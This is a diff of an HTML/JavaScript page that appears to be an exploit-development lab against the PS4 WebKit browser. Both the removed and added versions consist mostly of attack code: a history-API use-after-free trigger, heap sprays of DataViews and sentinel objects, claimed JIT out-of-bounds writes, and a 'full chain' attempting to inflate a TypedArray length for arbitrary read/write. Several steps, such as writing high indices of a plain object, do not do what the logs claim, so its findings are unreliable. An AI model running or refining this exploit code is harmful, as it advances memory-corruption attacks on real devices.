@@ -1,580 +1,155 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Mapeamento de Sobrescrita OOB</title>
+<title>PS4 WebKit UAF – Slot Intersection Lab</title>
+<style>
+body { font-family: monospace; background:#000; color:#0f0; }
+button { margin:4px; padding:6px; }
+pre { white-space: pre-wrap; }
+</style>
 </head>
 <body>
-<h1>Mapeamento de Sobrescrita - O que o JIT OOB Atinge </h1>
 
-<h2>Testes Disponiveis:</h2>
-<button onclick="testSentinel()">TEST 1 - Sentinelas ao Redor</button><br><br>
-<button onclick="testVictimArray()">TEST 2 - TypedArray Vitima</button><br><br>
-<button onclick="testObjectCorruption()">TEST 3 - Corrupcao de Objetos JS</button><br><br>
-<button onclick="testPreciseMapping()">TEST 4 - Mapeamento Preciso</button><br><br>
-<button onclick="testFullChain()">TEST 5 - CHAIN COMPLETA</button><br><br>
+<h2>PS4 WebKit UAF – Slot Intersection Lab</h2>
+
+<button onclick="runStringDirection()">Direction B – Fragment / String</button>
+<button onclick="runTypedArrayDirection()">Direction A – TypedArray / DataView</button>
+<button onclick="runHistoryStateDirection()">Direction H – History.state</button>
+<button onclick="runJITDirection()">Direction C – JIT on Victim</button>
 
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m) { logEl.textContent += m + "\n"; }
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function log(m){ logEl.textContent += m + "\n"; }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-// ========================================
-// UAF TRIGGER
-// ========================================
-async function triggerUAF() {
+/* ===============================
+   PHASE 1 — CONFIRMED UAF TRIGGER
+   (DO NOT MODIFY)
+   =============================== */
+async function triggerUAF(){
     log("=== UAF TRIGGER START ===");
     let size = 977;
     const STEP = 14461;
-    
-    for(let i = 0; i < 48; i++) {
+
+    for(let i=0;i<48;i++){
         let frag = "A".repeat(size);
-        history.pushState({i: i}, "", "#" + frag);
-        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) {
-            setTimeout(() => history.back(), 0);
+        history.pushState({}, "", "#"+frag);
+        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
+        if(i % 6 === 0){
+            setTimeout(()=>history.back(),0);
+            log(`[ITER ${i}] back() async`);
         }
-        
         size += STEP;
         await sleep(5);
     }
-    
     log(">>> UAF WINDOW <<<");
-    await sleep(120);
 }
 
-// ========================================
-// JIT SETUP
-// ========================================
-function setupJIT() {
-    function jitWrite(arr, value) {
-        for(let i = 0; i < 10000; i++) {
-            arr[0] = value;
-        }
-    }
-    
-    let warmup = new Uint32Array(4);
-    for(let i = 0; i < 100; i++) {
-        jitWrite(warmup, i);
-    }
-    
-    return jitWrite;
+/* ===============================
+   COMMON READ PROBE
+   =============================== */
+function readURL(tag){
+    let u = document.URL;
+    log(`[${tag}] URL.length = ${u.length}`);
+    [32,64,128,256,512,1024].forEach(o=>{
+        let v;
+        try { v = u.charCodeAt(o); }
+        catch(e){ v = "EXC"; }
+        log(`[${tag}] charCodeAt(${o}) = ${v}`);
+    });
 }
 
-// ========================================
-// TEST 1: SENTINELAS AO REDOR
-// ========================================
-async function testSentinel() {
+/* ===============================
+   DIRECTION B — FRAGMENT / STRING
+   =============================== */
+async function runStringDirection(){
     logEl.textContent = "";
-    log("=== TEST 1: SENTINELAS AO REDOR ===\n");
-    
-    log(">>> JIT SETUP <<<");
-    let jitWrite = setupJIT();
-    log("JIT compilado");
-    
     await triggerUAF();
-    
-    log("\n>>> CRIANDO SENTINELAS <<<");
-    
-    // Sentinelas ANTES do fake array
-    let before = [];
-    for(let i = 0; i < 100; i++) {
-        before.push({
-            id: i,
-            marker: 0xBEFBEF00 + i,
-            type: "BEFORE",
-            data: [i, i+1, i+2, i+3]
-        });
-    }
-    
-    log("Sentinelas BEFORE: " + before.length);
-    
-    // FAKE ARRAY
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("Fake array criado (length: " + fakeArray.length + ")");
-    
-    // Sentinelas DEPOIS do fake array
-    let after = [];
-    for(let i = 0; i < 100; i++) {
-        after.push({
-            id: i,
-            marker: 0xAFBAFB00 + i,
-            type: "AFTER",
-            data: [i*10, i*10+1, i*10+2, i*10+3]
-        });
-    }
-    
-    log("Sentinelas AFTER: " + after.length);
-    
-    log("\n>>> SNAPSHOT INICIAL <<<");
-    log("before[0].marker: 0x" + before[0].marker.toString(16));
-    log("before[50].marker: 0x" + before[50].marker.toString(16));
-    log("after[0].marker: 0x" + after[0].marker.toString(16));
-    log("after[50].marker: 0x" + after[50].marker.toString(16));
-    
-    log("\n>>> EXECUTANDO JIT OOB WRITES <<<");
-    
-    // Escrever em varios offsets
-    let writeOffsets = [100, 500, 1000, 2000, 5000, 10000];
-    
-    for(let offset of writeOffsets) {
-        fakeArray[offset] = 0xDEAD0000 + offset;
-        log("Wrote to fakeArray[" + offset + "] = 0x" + (0xDEAD0000 + offset).toString(16));
-    }
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO SENTINELAS <<<");
-    
-    let corrupted = [];
-    
-    // Check BEFORE
-    for(let i = 0; i < before.length; i++) {
-        if(before[i].marker !== (0xBEFBEF00 + i)) {
-            corrupted.push({
-                type: "BEFORE",
-                id: i,
-                expected: "0x" + (0xBEFBEF00 + i).toString(16),
-                actual: "0x" + before[i].marker.toString(16)
-            });
-        }
-    }
-    
-    // Check AFTER
-    for(let i = 0; i < after.length; i++) {
-        if(after[i].marker !== (0xAFBAFB00 + i)) {
-            corrupted.push({
-                type: "AFTER",
-                id: i,
-                expected: "0x" + (0xAFBAFB00 + i).toString(16),
-                actual: "0x" + after[i].marker.toString(16)
-            });
-        }
-    }
-    
-    log("\n>>> RESULTADOS <<<");
-    log("Objetos corrompidos: " + corrupted.length);
-    
-    if(corrupted.length > 0) {
-        log("\n!!! CORRUPCAO DETECTADA !!!");
-        for(let c of corrupted) {
-            log("  " + c.type + "[" + c.id + "]: " + c.expected + " -> " + c.actual);
-        }
-    } else {
-        log("Nenhuma sentinela corrompida (writes isolados)");
-    }
-    
-    window.__keep1 = {before, fakeArray, after};
-    log("\n=== FIM TEST 1 ===");
+
+    readURL("BASE");
+
+    log(">>> FRAGMENT COLLAPSE <<<");
+    location.hash = "#X";
+    readURL("POST");
+    log("=== END DIRECTION B ===");
 }
 
-// ========================================
-// TEST 2: TYPEDARRAY VITIMA
-// ========================================
-async function testVictimArray() {
+/* ===============================
+   DIRECTION A — TYPEDARRAY / DATAVIEW
+   =============================== */
+async function runTypedArrayDirection(){
     logEl.textContent = "";
-    log("=== TEST 2: TYPEDARRAY VITIMA ===\n");
-    log("Objetivo: Sobrescrever length/buffer de TypedArray\n");
-    
-    log(">>> JIT SETUP <<<");
-    let jitWrite = setupJIT();
-    log("JIT compilado");
-    
     await triggerUAF();
-    
-    log("\n>>> CRIANDO VICTIM TYPEDARRAY <<<");
-    
-    let victim = new Uint32Array(16);
-    for(let i = 0; i < victim.length; i++) {
-        victim[i] = 0x11110000 + i;
+
+    readURL("BASE");
+
+    log("=== SLOT FIXATION (TypedArray/DataView) ===");
+    let sprays = [];
+    for(let i=0;i<4000;i++){
+        let ab = new ArrayBuffer(16);
+        sprays.push(new DataView(ab));
     }
-    
-    log("Victim array criado:");
-    log("  victim.length: " + victim.length);
-    log("  victim.byteLength: " + victim.byteLength);
-    log("  victim[0]: 0x" + victim[0].toString(16));
-    log("  victim[15]: 0x" + victim[15].toString(16));
-    
-    log("\n>>> FAKE ARRAY <<<");
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> JIT OOB WRITES (TENTANDO ATINGIR VICTIM) <<<");
-    
-    // Tentar varios offsets para atingir victim
-    for(let i = 0; i < 100; i++) {
-        let offset = 100 + (i * 50);
-        fakeArray[offset] = 0xC0DE0000 + i;
-    }
-    
-    log("Executados 100 writes OOB");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO VICTIM <<<");
-    
-    log("victim.length: " + victim.length);
-    log("victim.byteLength: " + victim.byteLength);
-    
-    let victimCorrupted = false;
-    for(let i = 0; i < Math.min(victim.length, 16); i++) {
-        let expected = 0x11110000 + i;
-        let actual = victim[i];
-        
-        if(actual !== expected) {
-            log("  victim[" + i + "]: 0x" + actual.toString(16) + " (esperado: 0x" + expected.toString(16) + ")");
-            victimCorrupted = true;
-        }
-    }
-    
-    if(victimCorrupted) {
-        log("\n!!! TYPEDARRAY CORROMPIDO !!!");
-        
-        // Se length foi inflado, tentar ler alem
-        if(victim.length > 16) {
-            log("\nVictim.length INFLADO! Tentando read arbitrario:");
-            for(let i = 16; i < Math.min(victim.length, 32); i++) {
-                try {
-                    let val = victim[i];
-                    log("  victim[" + i + "] = 0x" + val.toString(16));
-                } catch(e) {
-                    log("  victim[" + i + "] = ERROR");
-                    break;
-                }
-            }
-        }
-    } else {
-        log("Victim nao corrompido ainda");
-    }
-    
-    window.__keep2 = {victim, fakeArray};
-    log("\n=== FIM TEST 2 ===");
+
+    readURL("POST");
+    log("=== END DIRECTION A ===");
 }
 
-// ========================================
-// TEST 3: CORRUPCAO DE OBJETOS JS
-// ========================================
-async function testObjectCorruption() {
+/* ===============================
+   DIRECTION H — HISTORY.STATE
+   =============================== */
+async function runHistoryStateDirection(){
     logEl.textContent = "";
-    log("=== TEST 3: CORRUPCAO DE OBJETOS JS ===\n");
-    
-    log(">>> JIT SETUP <<<");
-    let jitWrite = setupJIT();
-    log("JIT compilado");
-    
     await triggerUAF();
-    
-    log("\n>>> CRIANDO OBJETOS ALVO <<<");
-    
-    let targets = [];
-    for(let i = 0; i < 50; i++) {
-        targets.push({
-            id: i,
-            value: 0x50505050,
-            ptr: null,
-            flag: true,
-            name: "target_" + i
-        });
-    }
-    
-    log("Criados " + targets.length + " objetos alvo");
-    
-    log("\n>>> FAKE ARRAY <<<");
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> JIT OOB WRITES <<<");
-    
-    // Pattern especifico de escrita
-    for(let i = 0; i < 200; i++) {
-        let offset = 50 + i;
-        fakeArray[offset] = 0xBADBAD00 + (i % 256);
-    }
-    
-    log("200 writes executados (offsets 50-249)");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO TARGETS <<<");
-    
-    let corruptions = [];
-    for(let i = 0; i < targets.length; i++) {
-        let t = targets[i];
-        let changed = false;
-        let changes = [];
-        
-        if(t.id !== i) {
-            changed = true;
-            changes.push("id: " + i + " -> " + t.id);
-        }
-        if(t.value !== 0x50505050) {
-            changed = true;
-            changes.push("value: 0x50505050 -> 0x" + t.value.toString(16));
-        }
-        if(t.flag !== true) {
-            changed = true;
-            changes.push("flag: true -> " + t.flag);
-        }
-        if(t.name !== "target_" + i) {
-            changed = true;
-            changes.push("name: target_" + i + " -> " + t.name);
-        }
-        
-        if(changed) {
-            corruptions.push({id: i, changes: changes});
-        }
-    }
-    
-    log("\n>>> RESULTADOS <<<");
-    log("Objetos corrompidos: " + corruptions.length);
-    
-    if(corruptions.length > 0) {
-        log("\n!!! CORRUPCAO DE OBJETOS JS DETECTADA !!!");
-        for(let c of corruptions) {
-            log("\nTarget [" + c.id + "]:");
-            for(let change of c.changes) {
-                log("  " + change);
-            }
-        }
-    } else {
-        log("Nenhum objeto corrompido");
-    }
-    
-    window.__keep3 = {targets, fakeArray};
-    log("\n=== FIM TEST 3 ===");
+
+    log("[BASE] history.state = " + JSON.stringify(history.state));
+    readURL("BASE");
+
+    log("=== STATE CHURN ===");
+    history.replaceState({ctrl:"A"}, "", "#A");
+    history.replaceState({ctrl:"B"}, "", "#B");
+    setTimeout(()=>history.back(),0);
+
+    await sleep(10);
+
+    log("[POST] history.state = " + JSON.stringify(history.state));
+    readURL("POST");
+    log("=== END DIRECTION H ===");
 }
 
-// ========================================
-// TEST 4: MAPEAMENTO PRECISO
-// ========================================
-async function testPreciseMapping() {
+/* ===============================
+   DIRECTION C — JIT ON VICTIM
+   =============================== */
+function jitFunc(arr){
+    for(let i=0;i<1000;i++){
+        arr[0] = i;
+    }
+    return arr[0];
+}
+
+async function runJITDirection(){
     logEl.textContent = "";
-    log("=== TEST 4: MAPEAMENTO PRECISO DE OFFSETS ===\n");
-    
-    log(">>> JIT SETUP <<<");
-    let jitWrite = setupJIT();
-    log("JIT compilado");
-    
     await triggerUAF();
-    
-    log("\n>>> CRIANDO MAPA DE MEMORIA <<<");
-    
-    // Criar grid de objetos para mapear
-    let grid = [];
-    for(let i = 0; i < 20; i++) {
-        let row = [];
-        for(let j = 0; j < 10; j++) {
-            row.push({
-                row: i,
-                col: j,
-                marker: 0x12340000 + (i * 10 + j),
-                data: new Uint32Array([i, j, i+j, i*j])
-            });
-        }
-        grid.push(row);
-    }
-    
-    log("Grid criado: 20 rows x 10 cols = 200 objetos");
-    
-    log("\n>>> FAKE ARRAY <<<");
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> WRITES MAPEADOS <<<");
-    
-    // Escrever em offsets especificos com valores unicos
-    let writeMap = [];
-    for(let i = 0; i < 50; i++) {
-        let offset = 100 + (i * 100);
-        let value = 0xFEED0000 + i;
-        fakeArray[offset] = value;
-        writeMap.push({offset: offset, value: value});
-    }
-    
-    log("50 writes mapeados (offsets 100-4900, step 100)");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> SCANEANDO GRID <<<");
-    
-    let hits = [];
-    for(let i = 0; i < grid.length; i++) {
-        for(let j = 0; j < grid[i].length; j++) {
-            let obj = grid[i][j];
-            let expectedMarker = 0x12340000 + (i * 10 + j);
-            
-            if(obj.marker !== expectedMarker) {
-                // Check qual write atingiu
-                let matchingWrite = null;
-                for(let w of writeMap) {
-                    if(obj.marker === w.value) {
-                        matchingWrite = w;
-                        break;
-                    }
-                }
-                
-                hits.push({
-                    row: i,
-                    col: j,
-                    expected: "0x" + expectedMarker.toString(16),
-                    actual: "0x" + obj.marker.toString(16),
-                    write: matchingWrite
-                });
-            }
-        }
-    }
-    
-    log("\n>>> MAPA DE HITS <<<");
-    log("Total de hits: " + hits.length);
-    
-    if(hits.length > 0) {
-        log("\n!!! MAPEAMENTO BEM-SUCEDIDO !!!");
-        for(let h of hits) {
-            let writeInfo = h.write ? 
-                " <- Write offset " + h.write.offset : 
-                " (unknown write)";
-            log("Grid[" + h.row + "][" + h.col + "]: " + h.actual + writeInfo);
-        }
-        
-        log("\n>>> ANALISE <<<");
-        if(hits.length > 0 && hits[0].write) {
-            let avgOffset = hits.reduce((sum, h) => sum + (h.write ? h.write.offset : 0), 0) / hits.length;
-            log("Offset medio de hit: ~" + Math.floor(avgOffset));
-        }
-    } else {
-        log("Nenhum hit detectado");
-    }
-    
-    window.__keep4 = {grid, fakeArray, writeMap};
-    log("\n=== FIM TEST 4 ===");
-}
 
-// ========================================
-// TEST 5: CHAIN COMPLETA
-// ========================================
-async function testFullChain() {
-    logEl.textContent = "";
-    log("=== TEST 5: CHAIN COMPLETA - ARBITRARY RW ===\n");
-    log("Objetivo: Inflar TypedArray.length via JIT OOB\n");
-    
-    log(">>> JIT SETUP <<<");
-    let jitWrite = setupJIT();
-    log("JIT compilado");
-    
-    await triggerUAF();
-    
-    log("\n>>> SETUP VICTIM TYPEDARRAY <<<");
-    let victim = new Uint32Array(8);
-    for(let i = 0; i < 8; i++) {
-        victim[i] = 0xAAAA0000 + i;
-    }
-    
-    log("Victim inicial:");
-    log("  length: " + victim.length);
-    log("  byteLength: " + victim.byteLength);
-    
-    log("\n>>> FAKE ARRAY <<<");
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> TENTANDO SOBRESCREVER VICTIM.LENGTH <<<");
-    
-    // Tentar varios offsets procurando o length field
-    let attempts = [];
-    for(let baseOffset = 0; baseOffset < 5000; baseOffset += 50) {
-        // Tentar sobrescrever length com valor grande
-        fakeArray[baseOffset] = 0x10000; // 65536
-        fakeArray[baseOffset + 1] = 0x10000;
-        fakeArray[baseOffset + 2] = 0x10000;
-        
-        attempts.push(baseOffset);
-    }
-    
-    log("Tentados " + attempts.length + " offsets para inflar length");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(100);
-    
-    log("\n>>> VERIFICANDO VICTIM <<<");
-    log("victim.length: " + victim.length);
-    log("victim.byteLength: " + victim.byteLength);
-    
-    if(victim.length > 8) {
-        log("\n!!! LENGTH INFLADO - ARBITRARY READ OBTIDO !!!");
-        
-        log("\nTentando ler alem dos limites originais:");
-        for(let i = 8; i < Math.min(victim.length, 64); i++) {
-            try {
-                let val = victim[i];
-                if(val !== 0 && val !== undefined) {
-                    log("  victim[" + i + "] = 0x" + val.toString(16) + " <- HEAP LEAK!");
-                }
-            } catch(e) {
-                log("  victim[" + i + "] = error");
-                break;
-            }
-        }
-        
-        log("\n>>> TESTANDO ARBITRARY WRITE <<<");
-        try {
-            victim[100] = 0xDEADBEEF;
-            let readback = victim[100];
-            log("Write test: victim[100] = 0xDEADBEEF");
-            log("Read back: victim[100] = 0x" + readback.toString(16));
-            
-            if(readback === 0xDEADBEEF) {
-                log("\n!!! ARBITRARY WRITE CONFIRMADO !!!");
-            }
-        } catch(e) {
-            log("Write test failed: " + e);
-        }
-        
-    } else {
-        log("\nLength nao inflado ainda");
-        log("Verificando corrupcao parcial:");
-        
-        for(let i = 0; i < 8; i++) {
-            let expected = 0xAAAA0000 + i;
-            let actual = victim[i];
-            if(actual !== expected) {
-                log("  victim[" + i + "]: 0x" + actual.toString(16) + " (esperado: 0x" + expected.toString(16) + ")");
-            }
-        }
-    }
-    
-    window.__keep5 = {victim, fakeArray};
-    log("\n=== FIM TEST 5 ===");
-}
+    readURL("BASE");
 
-log("Escolha um teste acima.");
-log("\nRecomendado: Comece com TEST 1 (Sentinelas)");
-log("Se TEST 1 mostrar corrupcao, va para TEST 4 (Mapeamento)");
-log("Se mapeamento funcionar, va para TEST 5 (Chain Completa)");
+    log("=== JIT WARMUP ===");
+    let ta = new Uint32Array(4);
+    for(let i=0;i<10000;i++) jitFunc(ta);
+
+    log("=== JIT PROBE ===");
+    try{
+        ta[4] = 0xdeadbeef;
+        log("[JIT] write/read idx 4 = 0x" + ta[4].toString(16));
+    }catch(e){
+        log("[JIT] exception");
+    }
+
+    readURL("POST");
+    log("=== END DIRECTION C ===");
+}
 </script>
 
 </body>
